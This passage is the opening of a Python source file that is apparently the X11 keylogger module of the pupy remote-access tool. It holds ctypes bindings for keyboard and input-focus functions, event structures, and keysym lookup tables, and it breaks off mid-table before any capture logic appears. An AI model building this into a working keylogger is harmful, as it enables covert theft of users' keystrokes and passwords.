# -*- coding: utf-8 -*-
# inspired from https://github.com/amoffat/pykeylogger
import sys
from time import sleep, time
import ctypes as ct
from ctypes.util import find_library
import pupy

import os

try:
    x11 = ct.cdll.LoadLibrary(find_library('X11'))

    x11.XkbOpenDisplay.restype = ct.c_void_p
    x11.XkbOpenDisplay.argtypes = [
        ct.c_char_p,
        ct.c_void_p, ct.c_void_p, ct.c_void_p, ct.c_void_p, ct.c_void_p
    ]
    x11.XCloseDisplay.argtypes = [ct.c_void_p]
    x11.XQueryKeymap.restype = ct.c_int
    x11.XQueryKeymap.argtypes = [ct.c_void_p, ct.c_void_p]
    x11.XGetInputFocus.restype = ct.c_int
    x11.XGetInputFocus.argtypes = [ct.c_void_p, ct.c_void_p, ct.c_void_p]
    x11.XGetClassHint.restype = ct.c_int
    x11.XGetClassHint.argtypes = [ct.c_void_p, ct.c_ulong, ct.c_void_p]
    x11.XkbGetKeyboard.restype = ct.c_void_p
    x11.XkbGetKeyboard.argtypes = [ct.c_void_p, ct.c_uint, ct.c_uint]
    x11.XkbGetState.argtypes = [ct.c_void_p, ct.c_uint, ct.c_void_p]
    x11.XKeycodeToKeysym.restype = ct.c_uint
    x11.XKeycodeToKeysym.argtypes = [ct.c_void_p, ct.c_uint]
    x11.XkbKeycodeToKeysym.restype = ct.c_uint
    x11.XkbKeycodeToKeysym.argtypes = [ct.c_void_p, ct.c_uint]
    x11.XDefaultRootWindow.restype = ct.c_ulong
    x11.XDefaultRootWindow.argtypes = [ct.c_void_p]
    x11.XNextEvent.argtypes = [ct.c_void_p, ct.c_void_p]
    x11.XMapWindow.argtypes = [ct.c_void_p, ct.c_ulong]
    x11.XSync.argtypes = [ct.c_void_p, ct.c_int]
    x11.XMaskEvent.argtypes = [ct.c_void_p, ct.c_ulong, ct.c_void_p]
    x11.XSelectInput.argtypes = [ct.c_void_p, ct.c_uint, ct.c_long]
    x11.XDestroyWindow.argtypes = [ct.c_void_p, ct.c_ulong]
    x11.XGetEventData.argtypes = [ct.c_void_p, ct.c_void_p]
    x11.XFreeEventData.argtypes = [ct.c_void_p, ct.c_void_p]
    x11.XQueryExtension.argtypes = [ct.c_void_p, ct.c_char_p, ct.c_void_p, ct.c_void_p, ct.c_void_p]
    x11.XSetErrorHandler.restype = ct.c_int
    x11.XSetErrorHandler.argtypes = [ct.c_void_p]
    x11.XSetIOErrorHandler.restype = ct.c_int
    x11.XSetIOErrorHandler.argtypes = [ct.c_void_p]
except:
    x11 = None

try:
    xi = ct.cdll.LoadLibrary(find_library('Xi'))
    xi.XOpenDevice.restype = ct.c_void_p
    xi.XOpenDevice.argtypes = [ct.c_void_p, ct.c_uint]
    xi.XCloseDevice.argtypes = [ct.c_void_p, ct.c_void_p]
    xi.XISelectEvents.argtypes = [ct.c_void_p, ct.c_uint, ct.c_void_p, ct.c_int]
except:
    xi = None

class ClassHint(ct.Structure):
    _fields_ = [
        ("name", ct.c_char_p),
        ("klass", ct.c_char_p)
    ]

class XkbState(ct.Structure):
    _fields_ = [
        ("group", ct.c_char),
        ("locked_group", ct.c_char),
        ("base_group", ct.c_char),
        ("latched_group", ct.c_char),
        ("mods", ct.c_char),
        ("base_mods", ct.c_char),
        ("latched_mods", ct.c_char),
        ("locked_mods", ct.c_char),
        ("compat_state", ct.c_char),
        ("grab_mods", ct.c_char),
        ("compat_grab_mods", ct.c_char),
        ("lookup_mods", ct.c_char),
        ("compat_lookup_mods", ct.c_char),
        ("ptr_buttons", ct.c_char)
    ]

class XiEventMask(ct.Structure):
    _fields_ = [
        ("deviceid", ct.c_int),
        ("mask_len", ct.c_int),
        ("mask", ct.c_void_p)
    ]

class XGenericEventCookie(ct.Structure):
    _fields_ = [
        ("type",        ct.c_int),
        ("serial",      ct.c_ulong),
        ("send_event",  ct.c_int),
        ("display",     ct.c_void_p),
        ("extension",   ct.c_int),
        ("evtype",      ct.c_int),
        ("cookie",      ct.c_uint),
        ("data",        ct.c_void_p)
    ]

class XEventType(ct.Structure):
    _fields_ = [
        ("type", ct.c_int),
        ("pad", ct.c_long * 24)
    ]

class XEvent(ct.Union):
    _fields_ = [
        ("type",   XEventType),
        ("cookie", XGenericEventCookie),
    ]

class XIValuatorState(ct.Structure):
    _fields_ = [
        ("mask_len",   ct.c_int),
        ("mask",       ct.c_void_p),
        ("values",     ct.c_void_p),
    ]

class XIButtonState(ct.Structure):
    _fields_ = [
        ("mask_len",   ct.c_int),
        ("mask",       ct.c_void_p)
    ]

class XIModifierState(ct.Structure):
    _fields_ = [
        ("base",       ct.c_int),
        ("latched",    ct.c_int),
        ("locked",     ct.c_int),
        ("effective",  ct.c_int),
    ]

class XIDeviceEvent(ct.Structure):
    _fields_ = [
        ("type",       ct.c_int),
        ("serial",     ct.c_ulong),
        ("send_event", ct.c_int),
        ("display",    ct.c_void_p),
        ("extension",  ct.c_int),
        ("evtype",     ct.c_int),
        ("time",       ct.c_ulong),
        ("deviceid",   ct.c_int),
        ("sourceid",   ct.c_int),
        ("detail",     ct.c_int),
        ("root",       ct.c_ulong),
        ("event",      ct.c_ulong),
        ("child",      ct.c_ulong),
        ("root_x",     ct.c_double),
        ("root_y",     ct.c_double),
        ("event_x",    ct.c_double),
        ("event_y",    ct.c_double),
        ("flags",      ct.c_int),
        ("buttons",    XIButtonState),
        ("valuators",  XIValuatorState),
        ("mods",       XIModifierState),
        ("group",      XIModifierState),
    ]

class XErrorEvent(ct.Structure):
    _fields_ = [
        ("type",       ct.c_int),
        ("display",    ct.c_void_p),
        ("serial",     ct.c_uint),
        ("error_code", ct.c_char),
        ("request_code", ct.c_char),
        ("minor_code", ct.c_char),
        ("XID",        ct.c_ulong)
    ]

def XiMaxLen():
    return (((27) >> 3) + 1)

def XiSetMask(mask, event):
    mask[(event)>>3] |= (1 << ((event) & 7))


KEYSYM_TO_XK_TABLE = {
    0xff08: "BackSpace", 0xff09: "Tab", 0xff0a: "Linefeed",
    0xff0b: "Clear", 0xff0d: "Return", 0xff13: "Pause",
    0xff14: "Scroll_Lock", 0xff15: "Sys_Req", 0xff1b: "Escape",
    0xff20: "Multi_key", 0xff21: "Kanji", 0xff22: "Muhenkan",
    0xff23: "Henkan_Mode", 0xff24: "Romaji", 0xff25: "Hiragana",
    0xff26: "Katakana", 0xff27: "Hiragana_Katakana", 0xff28: "Zenkaku",
    0xff29: "Hankaku", 0xff2a: "Zenkaku_Hankaku", 0xff2b: "Touroku",
    0xff2c: "Massyo", 0xff2d: "Kana_Lock", 0xff2e: "Kana_Shift",
    0xff2f: "Eisu_Shift", 0xff30: "Eisu_toggle", 0xff31: "Hangul",
    0xff32: "Hangul_Start", 0xff33: "Hangul_End", 0xff34: "Hangul_Hanja",
    0xff35: "Hangul_Jamo", 0xff36: "Hangul_Romaja", 0xff37: "Codeinput",
    0xff38: "Hangul_Jeonja", 0xff39: "Hangul_Banja", 0xff3a: "Hangul_PreHanja",
    0xff3b: "Hangul_PostHanja", 0xff3c: "SingleCandidate", 0xff3d: "MultipleCandidate",
    0xff3e: "PreviousCandidate", 0xff3f: "Hangul_Special", 0xff50: "Home",
    0xff51: "Left", 0xff52: "Up", 0xff53: "Right",
    0xff54: "Down", 0xff55: "Prior", 0xff56: "Next",
    0xff57: "End", 0xff58: "Begin", 0xff60: "Select",
    0xff61: "Print", 0xff62: "Execute", 0xff63: "Insert",
    0xff65: "Undo", 0xff66: "Redo", 0xff67: "Menu",
    0xff68: "Find", 0xff69: "Cancel", 0xff6a: "Help",
    0xff6b: "Break", 0xff7e: "Mode_switch", 0xff7f: "Num_Lock",
    0xff80: "KP_Space", 0xff89: "KP_Tab", 0xff8d: "KP_Enter",
    0xff91: "KP_F1", 0xff92: "KP_F2", 0xff93: "KP_F3",
    0xff94: "KP_F4", 0xff95: "KP_Home", 0xff96: "KP_Left",
    0xff97: "KP_Up", 0xff98: "KP_Right", 0xff99: "KP_Down",
    0xff9a: "KP_Prior", 0xff9b: "KP_Next", 0xff9c: "KP_End",
    0xff9d: "KP_Begin", 0xff9e: "KP_Insert", 0xff9f: "KP_Delete",
    0xffaa: "KP_Multiply", 0xffab: "KP_Add", 0xffac: "KP_Separator",
    0xffad: "KP_Subtract", 0xffae: "KP_Decimal", 0xffaf: "KP_Divide",
    0xffb0: "KP_0", 0xffb1: "KP_1", 0xffb2: "KP_2",
    0xffb3: "KP_3", 0xffb4: "KP_4", 0xffb5: "KP_5",
    0xffb6: "KP_6", 0xffb7: "KP_7", 0xffb8: "KP_8",
    0xffb9: "KP_9", 0xffbd: "KP_Equal", 0xffbe: "F1",
    0xffbf: "F2", 0xffc0: "F3", 0xffc1: "F4",
    0xffc2: "F5", 0xffc3: "F6", 0xffc4: "F7",
    0xffc5: "F8", 0xffc6: "F9", 0xffc7: "F10",
    0xffc8: "F11", 0xffc9: "F12", 0xffca: "F13",
    0xffcb: "F14", 0xffcc: "F15", 0xffcd: "F16",
    0xffce: "F17", 0xffcf: "F18", 0xffd0: "F19",
    0xffd1: "F20", 0xffd2: "F21", 0xffd3: "F22",
    0xffd4: "F23", 0xffd5: "F24", 0xffd6: "F25",
    0xffd7: "F26", 0xffd8: "F27", 0xffd9: "F28",
    0xffda: "F29", 0xffdb: "F30", 0xffdc: "F31",
    0xffdd: "F32", 0xffde: "F33", 0xffdf: "F34",
    0xffe0: "F35", 0xffe1: "Shift_L", 0xffe2: "Shift_R",
    0xffe3: "Control_L", 0xffe4: "Control_R", 0xffe5: "Caps_Lock",
    0xffe6: "Shift_Lock", 0xffe7: "Meta_L", 0xffe8: "Meta_R",
    0xffe9: "Alt_L", 0xffea: "Alt_R", 0xffeb: "Super_L",
    0xffec: "Super_R", 0xffed: "Hyper_L", 0xffee: "Hyper_R",
    0xfff1: "braille_dot_1", 0xfff2: "braille_dot_2", 0xfff3: "braille_dot_3",
    0xfff4: "braille_dot_4", 0xfff5: "braille_dot_5", 0xfff6: "braille_dot_6",
    0xfff7: "braille_dot_7", 0xfff8: "braille_dot_8", 0xfff9: "braille_dot_9",
    0xfffa: "braille_dot_10", 0xffff: "Delete"
}

def keysym_to_XK(ks):
    return KEYSYM_TO_XK_TABLE.get(ks)


# https://raw.githubusercontent.com/substack/node-keysym/master/data/keysyms.txt
KEYSYM_TO_UNICODE_TABLE = {
    0x0020: u'\u0020', 0x0021: u'\u0021', 0x0022: u'\u0022', 0x0023: u'\u0023', 0x0024: u'\u0024',
    0x0025: u'\u0025', 0x0026: u'\u0026', 0x0027: u'\u0027', 0x0027: u'\u0027', 0x0028: u'\u0028',
    0x0029: u'\u0029', 0x002a: u'\u002a', 0x002b: u'\u002b', 0x002c: u'\u002c', 0x002d: u'\u002d',
    0x002e: u'\u002e', 0x002f: u'\u002f', 0x0030: u'\u0030', 0x0031: u'\u0031', 0x0032: u'\u0032',
    0x0033: u'\u0033', 0x0034: u'\u0034', 0x0035: u'\u0035', 0x0036: u'\u0036', 0x0037: u'\u0037',
    0x0038: u'\u0038', 0x0039: u'\u0039', 0x003a: u'\u003a', 0x003b: u'\u003b', 0x003c: u'\u003c',
    0x003d: u'\u003d', 0x003e: u'\u003e', 0x003f: u'\u003f', 0x0040: u'\u0040', 0x0041: u'\u0041',
    0x0042: u'\u0042', 0x0043: u'\u0043', 0x0044: u'\u0044', 0x0045: u'\u0045', 0x0046: u'\u0046',
    0x0047: u'\u0047', 0x0048: u'\u0048', 0x0049: u'\u0049', 0x004a: u'\u004a', 0x004b: u'\u004b',
    0x004c: u'\u004c', 0x004d: u'\u004d', 0x004e: u'\u004e', 0x004f: u'\u004f', 0x0050: u'\u0050',
    0x0051: u'\u0051', 0x0052: u'\u0052', 0x0053: u'\u0053', 0x0054: u'\u0054', 0x0055: u'\u0055',
    0x0056: u'\u0056', 0x0057: u'\u0057', 0x0058: u'\u0058', 0x0059: u'\u0059', 0x005a: u'\u005a',
    0x005b: u'\u005b', 0x005c: u'\u005c', 0x005d: u'\u005d', 0x005e: u'\u005e', 0x005f: u'\u005f',
    0x0060: u'\u0060', 0x0060: u'\u0060', 0x0061: u'\u0061', 0x0062: u'\u0062', 0x0063: u'\u0063',
    0x0064: u'\u0064', 0x0065: u'\u0065', 0x0066: u'\u0066', 0x0067: u'\u0067', 0x0068: u'\u0068',
    0x0069: u'\u0069', 0x006a: u'\u006a', 0x006b: u'\u006b', 0x006c: u'\u006c', 0x006d: u'\u006d',
    0x006e: u'\u006e', 0x006f: u'\u006f', 0x0070: u'\u0070', 0x0071: u'\u0071', 0x0072: u'\u0072',
    0x0073: u'\u0073', 0x0074: u'\u0074', 0x0075: u'\u0075', 0x0076: u'\u0076', 0x0077: u'\u0077',
    0x0078: u'\u0078', 0x0079: u'\u0079', 0x007a: u'\u007a', 0x007b: u'\u007b', 0x007c: u'\u007c',
    0x007d: u'\u007d', 0x007e: u'\u007e', 0x00a0: u'\u00a0', 0x00a1: u'\u00a1', 0x00a2: u'\u00a2',
    0x00a3: u'\u00a3', 0x00a4: u'\u00a4', 0x00a5: u'\u00a5', 0x00a6: u'\u00a6', 0x00a7: u'\u00a7',
    0x00a8: u'\u00a8', 0x00a9: u'\u00a9', 0x00aa: u'\u00aa', 0x00ab: u'\u00ab', 0x00ac: u'\u00ac',
    0x00ad: u'\u00ad', 0x00ae: u'\u00ae', 0x00af: u'\u00af', 0x00b0: u'\u00b0', 0x00b1: u'\u00b1',
    0x00b2: u'\u00b2', 0x00b3: u'\u00b3', 0x00b4: u'\u00b4', 0x00b5: u'\u00b5', 0x00b6: u'\u00b6',
    0x00b7: u'\u00b7', 0x00b8: u'\u00b8', 0x00b9: u'\u00b9', 0x00ba: u'\u00ba', 0x00bb: u'\u00bb',
    0x00bc: u'\u00bc', 0x00bd: u'\u00bd', 0x00be: u'\u00be', 0x00bf: u'\u00bf', 0x00c0: u'\u00c0',
    0x00c1: u'\u00c1', 0x00c2: u'\u00c2', 0x00c3: u'\u00c3', 0x00c4: u'\u00c4', 0x00c5: u'\u00c5',
    0x00c6: u'\u00c6', 0x00c7: u'\u00c7', 0x00c8: u'\u00c8', 0x00c9: u'\u00c9', 0x00ca: u'\u00ca',
    0x00cb: u'\u00cb', 0x00cc: u'\u00cc', 0x00cd: u'\u00cd', 0x00ce: u'\u00ce', 0x00cf: u'\u00cf',
    0x00d0: u'\u00d0', 0x00d0: u'\u00d0', 0x00d1: u'\u00d1', 0x00d2: u'\u00d2', 0x00d3: u'\u00d3',
    0x00d4: u'\u00d4', 0x00d5: u'\u00d5', 0x00d6: u'\u00d6', 0x00d7: u'\u00d7', 0x00d8: u'\u00d8',
    0x00d9: u'\u00d9', 0x00da: u'\u00da', 0x00db: u'\u00db', 0x00dc: u'\u00dc', 0x00dd: u'\u00dd',
    0x00de: u'\u00de', 0x00de: u'\u00de', 0x00df: u'\u00df', 0x00e0: u'\u00e0', 0x00e1: u'\u00e1',
    0x00e2: u'\u00e2', 0x00e3: u'\u00e3', 0x00e4: u'\u00e4', 0x00e5: u'\u00e5', 0x00e6: u'\u00e6',
    0x00e7: u'\u00e7', 0x00e8: u'\u00e8', 0x00e9: u'\u00e9', 0x00ea: u'\u00ea', 0x00eb: u'\u00eb',
    0x00ec: u'\u00ec', 0x00ed: u'\u00ed', 0x00ee: u'\u00ee', 0x00ef: u'\u00ef', 0x00f0: u'\u00f0',
    0x00f1: u'\u00f1', 0x00f2: u'\u00f2', 0x00f3: u'\u00f3', 0x00f4: u'\u00f4', 0x00f5: u'\u00f5',
    0x00f6: u'\u00f6', 0x00f7: u'\u00f7', 0x00f8: u'\u00f8', 0x00f9: u'\u00f9', 0x00fa: u'\u00fa',
    0x00fb: u'\u00fb', 0x00fc: u'\u00fc', 0x00fd: u'\u00fd', 0x00fe: u'\u00fe', 0x00ff: u'\u00ff',
    0x01a1: u'\u0104', 0x01a2: u'\u02d8', 0x01a3: u'\u0141', 0x01a5: u'\u013d', 0x01a6: u'\u015a',
    0x01a9: u'\u0160', 0x01aa: u'\u015e', 0x01ab: u'\u0164', 0x01ac: u'\u0179', 0x01ae: u'\u017d',
    0x01af: u'\u017b', 0x01b1: u'\u0105', 0x01b2: u'\u02db', 0x01b3: u'\u0142', 0x01b5: u'\u013e',
    0x01b6: u'\u015b', 0x01b7: u'\u02c7', 0x01b9: u'\u0161', 0x01ba: u'\u015f', 0x01bb: u'\u0165',
    0x01bc: u'\u017a', 0x01bd: u'\u02dd', 0x01be: u'\u017e', 0x01bf: u'\u017c', 0x01c0: u'\u0154',
    0x01c3: u'\u0102', 0x01c5: u'\u0139', 0x01c6: u'\u0106', 0x01c8: u'\u010c', 0x01ca: u'\u0118',
    0x01cc: u'\u011a', 0x01cf: u'\u010e', 0x01d0: u'\u0110', 0x01d1: u'\u0143', 0x01d2: u'\u0147',
    0x01d5: u'\u0150', 0x01d8: u'\u0158', 0x01d9: u'\u016e', 0x01db: u'\u0170', 0x01de: u'\u0162',
    0x01e0: u'\u0155', 0x01e3: u'\u0103', 0x01e5: u'\u013a', 0x01e6: u'\u0107', 0x01e8: u'\u010d',
    0x01ea: u'\u0119', 0x01ec: u'\u011b', 0x01ef: u'\u010f', 0x01f0: u'\u0111', 0x01f1: u'\u0144',
    0x01f2: u'\u0148', 0x01f5: u'\u0151', 0x01f8: u'\u0159', 0x01f9: u'\u016f', 0x01fb: u'\u0171',
    0x01fe: u'\u0163', 0x01ff: u'\u02d9', 0x02a1: u'\u0126', 0x02a6: u'\u0124', 0x02a9: u'\u0130',
    0x02ab: u'\u011e', 0x02ac: u'\u0134', 0x02b1: u'\u0127', 0x02b6: u'\u0125', 0x02b9: u'\u0131',
    0x02bb: u'\u011f', 0x02bc: u'\u0135', 0x02c5: u'\u010a', 0x02c6: u'\u0108', 0x02d5: u'\u0120',
    0x02d8: u'\u011c', 0x02dd: u'\u016c', 0x02de: u'\u015c', 0x02e5: u'\u010b', 0x02e6: u'\u0109',
    0x02f5: u'\u0121', 0x02f8: u'\u011d', 0x02fd: u'\u016d', 0x02fe: u'\u015d', 0x03a2: u'\u0138',
    0x03a3: u'\u0156', 0x03a5: u'\u0128', 0x03a6: u'\u013b', 0x03aa: u'\u0112', 0x03ab: u'\u0122',
    0x03ac: u'\u0166', 0x03b3: u'\u0157', 0x03b5: u'\u0129', 0x03b6: u'\u013c', 0x03ba: u'\u0113',
    0x03bb: u'\u0123', 0x03bc: u'\u0167', 0x03bd: u'\u014a', 0x03bf: u'\u014b', 0x03c0: u'\u0100',
    0x03c7: u'\u012e', 0x03cc: u'\u0116', 0x03cf: u'\u012a', 0x03d1: u'\u0145', 0x03d2: u'\u014c',
    0x03d3: u'\u0136', 0x03d9: u'\u0172', 0x03dd: u'\u0168', 0x03de: u'\u016a', 0x03e0: u'\u0101',
    0x03e7: u'\u012f', 0x03ec: u'\u0117', 0x03ef: u'\u012b', 0x03f1: u'\u0146', 0x03f2: u'\u014d',
    0x03f3: u'\u0137', 0x03f9: u'\u0173', 0x03fd: u'\u0169', 0x03fe: u'\u016b', 0x047e: u'\u203e',
    0x04a1: u'\u3002', 0x04a2: u'\u300c', 0x04a3: u'\u300d', 0x04a4: u'\u3001', 0x04a5: u'\u30fb',
    0x04a6: u'\u30f2', 0x04a7: u'\u30a1', 0x04a8: u'\u30a3', 0x04a9: u'\u30a5', 0x04aa: u'\u30a7',
    0x04ab: u'\u30a9', 0x04ac: u'\u30e3', 0x04ad: u'\u30e5', 0x04ae: u'\u30e7', 0x04af: u'\u30c3',
    0x04b0: u'\u30fc', 0x04b1: u'\u30a2', 0x04b2: u'\u30a4', 0x04b3: u'\u30a6', 0x04b4: u'\u30a8',
    0x04b5: u'\u30aa', 0x04b6: u'\u30ab', 0x04b7: u'\u30ad', 0x04b8: u'\u30af', 0x04b9: u'\u30b1',
    0x04ba: u'\u30b3', 0x04bb: u'\u30b5', 0x04bc: u'\u30b7', 0x04bd: u'\u30b9', 0x04be: u'\u30bb',
    0x04bf: u'\u30bd', 0x04c0: u'\u30bf', 0x04c1: u'\u30c1', 0x04c2: u'\u30c4', 0x04c3: u'\u30c6',
    0x04c4: u'\u30c8', 0x04c5: u'\u30ca', 0x04c6: u'\u30cb', 0x04c7: u'\u30cc', 0x04c8: u'\u30cd',
    0x04c9: u'\u30ce', 0x04ca: u'\u30cf', 0x04cb: u'\u30d2', 0x04cc: u'\u30d5', 0x04cd: u'\u30d8',
    0x04ce: u'\u30db', 0x04cf: u'\u30de', 0x04d0: u'\u30df', 0x04d1: u'\u30e0', 0x04d2: u'\u30e1',
    0x04d3: u'\u30e2', 0x04d4: u'\u30e4', 0x04d5: u'\u30e6', 0x04d6: u'\u30e8', 0x04d7: u'\u30e9',
    0x04d8: u'\u30ea', 0x04d9: u'\u30eb', 0x04da: u'\u30ec', 0x04db: u'\u30ed', 0x04dc: u'\u30ef',
    0x04dd: u'\u30f3', 0x04de: u'\u309b', 0x04df: u'\u309c', 0x05ac: u'\u060c', 0x05bb: u'\u061b',
    0x05bf: u'\u061f', 0x05c1: u'\u0621', 0x05c2: u'\u0622', 0x05c3: u'\u0623', 0x05c4: u'\u0624',
    0x05c5: u'\u0625', 0x05c6: u'\u0626', 0x05c7: u'\u0627', 0x05c8: u'\u0628', 0x05c9: u'\u0629',
    0x05ca: u'\u062a', 0x05cb: u'\u062b', 0x05cc: u'\u062c', 0x05cd: u'\u062d', 0x05ce: u'\u062e',
    0x05cf: u'\u062f', 0x05d0: u'\u0630', 0x05d1: u'\u0631', 0x05d2: u'\u0632', 0x05d3: u'\u0633',
    0x05d4: u'\u0634', 0x05d5: u'\u0635', 0x05d6: u'\u0636', 0x05d7: u'\u0637', 0x05d8: u'\u0638',
    0x05d9: u'\u0639', 0x05da: u'\u063a', 0x05e0: u'\u0640', 0x05e1: u'\u0641', 0x05e2: u'\u0642',
    0x05e3: u'\u0643', 0x05e4: u'\u0644', 0x05e5: u'\u0645', 0x05e6: u'\u0646', 0x05e7: u'\u0647',
    0x05e8: u'\u0648', 0x05e9: u'\u0649', 0x05ea: u'\u064a', 0x05eb: u'\u064b', 0x05ec: u'\u064c',
    0x05ed: u'\u064d', 0x05ee: u'\u064e', 0x05ef: u'\u064f', 0x05f0: u'\u0650', 0x05f1: u'\u0651',
    0x05f2: u'\u0652', 0x06a1: u'\u0452', 0x06a2: u'\u0453', 0x06a3: u'\u0451', 0x06a4: u'\u0454',
    0x06a5: u'\u0455', 0x06a6: u'\u0456', 0x06a7: u'\u0457', 0x06a8: u'\u0458', 0x06a9: u'\u0459',
    0x06aa: u'\u045a', 0x06ab: u'\u045b', 0x06ac: u'\u045c', 0x06ae: u'\u045e', 0x06af: u'\u045f',
    0x06b0: u'\u2116', 0x06b1: u'\u0402', 0x06b2: u'\u0403', 0x06b3: u'\u0401', 0x06b4: u'\u0404',
    0x06b5: u'\u0405', 0x06b6: u'\u0406', 0x06b7: u'\u0407', 0x06b8: u'\u0408', 0x06b9: u'\u0409',
    0x06ba: u'\u040a', 0x06bb: u'\u040b', 0x06bc: u'\u040c', 0x06be: u'\u040e', 0x06bf: u'\u040f',
    0x06c0: u'\u044e', 0x06c1: u'\u0430', 0x06c2: u'\u0431', 0x06c3: u'\u0446', 0x06c4: u'\u0434',
    0x06c5: u'\u0435', 0x06c6: u'\u0444', 0x06c7: u'\u0433', 0x06c8: u'\u0445', 0x06c9: u'\u0438',
    0x06ca: u'\u0439', 0x06cb: u'\u043a', 0x06cc: u'\u043b', 0x06cd: u'\u043c', 0x06ce: u'\u043d',
    0x06cf: u'\u043e', 0x06d0: u'\u043f', 0x06d1: u'\u044f', 0x06d2: u'\u0440', 0x06d3: u'\u0441',
    0x06d4: u'\u0442', 0x06d5: u'\u0443', 0x06d6: u'\u0436', 0x06d7: u'\u0432', 0x06d8: u'\u044c',
    0x06d9: u'\u044b', 0x06da: u'\u0437', 0x06db: u'\u0448', 0x06dc: u'\u044d', 0x06dd: u'\u0449',
    0x06de: u'\u0447', 0x06df: u'\u044a', 0x06e0: u'\u042e', 0x06e1: u'\u0410', 0x06e2: u'\u0411',
    0x06e3: u'\u0426', 0x06e4: u'\u0414', 0x06e5: u'\u0415', 0x06e6: u'\u0424', 0x06e7: u'\u0413',
    0x06e8: u'\u0425', 0x06e9: u'\u0418', 0x06ea: u'\u0419', 0x06eb: u'\u041a', 0x06ec: u'\u041b',
    0x06ed: u'\u041c', 0x06ee: u'\u041d', 0x06ef: u'\u041e', 0x06f0: u'\u041f', 0x06f1: u'\u042f',
    0x06f2: u'\u0420', 0x06f3: u'\u0421', 0x06f4: u'\u0422', 0x06f5: u'\u0423', 0x06f6: u'\u0416',
    0x06f7: u'\u0412', 0x06f8: u'\u042c', 0x06f9: u'\u042b', 0x06fa: u'\u0417', 0x06fb: u'\u0428',
    0x06fc: u'\u042d', 0x06fd: u'\u0429', 0x06fe: u'\u0427', 0x06ff: u'\u042a', 0x07a1: u'\u0386',
    0x07a2: u'\u0388', 0x07a3: u'\u0389', 0x07a4: u'\u038a', 0x07a5: u'\u03aa', 0x07a7: u'\u038c',
    0x07a8: u'\u038e', 0x07a9: u'\u03ab', 0x07ab: u'\u038f', 0x07ae: u'\u0385', 0x07af: u'\u2015',
    0x07b1: u'\u03ac', 0x07b2: u'\u03ad', 0x07b3: u'\u03ae', 0x07b4: u'\u03af', 0x07b5: u'\u03ca',
    0x07b6: u'\u0390', 0x07b7: u'\u03cc', 0x07b8: u'\u03cd', 0x07b9: u'\u03cb', 0x07ba: u'\u03b0',
    0x07bb: u'\u03ce', 0x07c1: u'\u0391', 0x07c2: u'\u0392', 0x07c3: u'\u0393', 0x07c4: u'\u0394',
    0x07c5: u'\u0395', 0x07c6: u'\u0396', 0x07c7: u'\u0397', 0x07c8: u'\u0398', 0x07c9: u'\u0399',
    0x07ca: u'\u039a', 0x07cb: u'\u039b', 0x07cb: u'\u039b', 0x07cc: u'\u039c', 0x07cd: u'\u039d',
    0x07ce: u'\u039e', 0x07cf: u'\u039f', 0x07d0: u'\u03a0', 0x07d1: u'\u03a1', 0x07d2: u'\u03a3',
    0x07d4: u'\u03a4', 0x07d5: u'\u03a5', 0x07d6: u'\u03a6', 0x07d7: u'\u03a7', 0x07d8: u'\u03a8',
    0x07d9: u'\u03a9', 0x07e1: u'\u03b1', 0x07e2: u'\u03b2', 0x07e3: u'\u03b3', 0x07e4: u'\u03b4',
    0x07e5: u'\u03b5', 0x07e6: u'\u03b6', 0x07e7: u'\u03b7', 0x07e8: u'\u03b8', 0x07e9: u'\u03b9',
    0x07ea: u'\u03ba', 0x07eb: u'\u03bb', 0x07ec: u'\u03bc', 0x07ed: u'\u03bd', 0x07ee: u'\u03be',
    0x07ef: u'\u03bf', 0x07f0: u'\u03c0', 0x07f1: u'\u03c1', 0x07f2: u'\u03c3', 0x07f3: u'\u03c2',
    0x07f4: u'\u03c4', 0x07f5: u'\u03c5', 0x07f6: u'\u03c6', 0x07f7: u'\u03c7', 0x07f8: u'\u03c8',
    0x07f9: u'\u03c9', 0x08a1: u'\u23b7', 0x08a2: u'\u250c', 0x08a3: u'\u2500', 0x08a4: u'\u2320',
    0x08a5: u'\u2321', 0x08a6: u'\u2502', 0x08a7: u'\u23a1', 0x08a8: u'\u23a3', 0x08a9: u'\u23a4',
    0x08aa: u'\u23a6', 0x08ab: u'\u239b', 0x08ac: u'\u239d', 0x08ad: u'\u239e', 0x08ae: u'\u23a0',
    0x08af: u'\u23a8', 0x08b0: u'\u23ac', 0x08bc: u'\u2264', 0x08bd: u'\u2260', 0x08be: u'\u2265',
    0x08bf: u'\u222b', 0x08c0: u'\u2234', 0x08c1: u'\u221d', 0x08c2: u'\u221e', 0x08c5: u'\u2207',
    0x08c8: u'\u223c', 0x08c9: u'\u2243', 0x08cd: u'\u21d4', 0x08ce: u'\u21d2', 0x08cf: u'\u2261',
    0x08d6: u'\u221a', 0x08da: u'\u2282', 0x08db: u'\u2283', 0x08dc: u'\u2229', 0x08dd: u'\u222a',
    0x08de: u'\u2227', 0x08df: u'\u2228', 0x08ef: u'\u2202', 0x08f6: u'\u0192', 0x08fb: u'\u2190',
    0x08fc: u'\u2191', 0x08fd: u'\u2192', 0x08fe: u'\u2193', 0x09e0: u'\u25c6', 0x09e1: u'\u2592',
    0x09e2: u'\u2409', 0x09e3: u'\u240c', 0x09e4: u'\u240d', 0x09e5: u'\u240a', 0x09e8: u'\u2424',
    0x09e9: u'\u240b', 0x09ea: u'\u2518', 0x09eb: u'\u2510', 0x09ec: u'\u250c', 0x09ed: u'\u2514',
    0x09ee: u'\u253c', 0x09ef: u'\u23ba', 0x09f0: u'\u23bb', 0x09f1: u'\u2500', 0x09f2: u'\u23bc',
    0x09f3: u'\u23bd', 0x09f4: u'\u251c', 0x09f5: u'\u2524', 0x09f6: u'\u2534', 0x09f7: u'\u252c',
    0x09f8: u'\u2502', 0x0aa1: u'\u2003', 0x0aa2: u'\u2002', 0x0aa3: u'\u2004', 0x0aa4: u'\u2005',
    0x0aa5: u'\u2007', 0x0aa6: u'\u2008', 0x0aa7: u'\u2009', 0x0aa8: u'\u200a', 0x0aa9: u'\u2014',
    0x0aaa: u'\u2013', 0x0aac: u'\u2423', 0x0aae: u'\u2026', 0x0aaf: u'\u2025', 0x0ab0: u'\u2153',
    0x0ab1: u'\u2154', 0x0ab2: u'\u2155', 0x0ab3: u'\u2156', 0x0ab4: u'\u2157', 0x0ab5: u'\u2158',
    0x0ab6: u'\u2159', 0x0ab7: u'\u215a', 0x0ab8: u'\u2105', 0x0abb: u'\u2012', 0x0abc: u'\u27e8',
    0x0abd: u'\u002e', 0x0abe: u'\u27e9', 0x0ac3: u'\u215b', 0x0ac4: u'\u215c', 0x0ac5: u'\u215d',
